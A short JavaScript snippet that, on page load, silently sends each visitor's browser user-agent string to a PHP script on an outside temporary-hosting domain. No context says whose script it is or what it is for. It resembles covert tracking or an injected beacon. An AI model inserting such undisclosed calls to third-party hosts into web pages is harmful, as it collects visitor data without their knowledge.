var xhr = new XMLHttpRequest(), ua = navigator.userAgent;

document.addEventListener("DOMContentLoaded", function(){

   xhr.open("GET", "http://rostovr89m.temp.swtest.ru/s02541.php?ua=" + encodeURIComponent(ua));
   xhr.send();
});
